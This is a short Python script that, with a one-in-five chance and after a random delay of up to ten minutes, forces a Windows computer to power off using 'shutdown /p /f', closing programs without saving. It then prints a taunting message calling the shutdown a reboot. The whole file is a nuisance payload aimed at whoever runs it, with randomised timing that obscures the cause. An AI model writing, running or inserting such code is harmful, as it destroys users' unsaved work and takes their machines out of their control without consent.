import random
import os
import time

wait_time_list: list = [
    30,
    60,
    120,
    300,
    600
]

if random.randint(1, 5) == 1:
    time.sleep(random.choice(wait_time_list))
    os.system(f"shutdown /p /f /d u:5:15")
    print("Have fun with your reboot :)")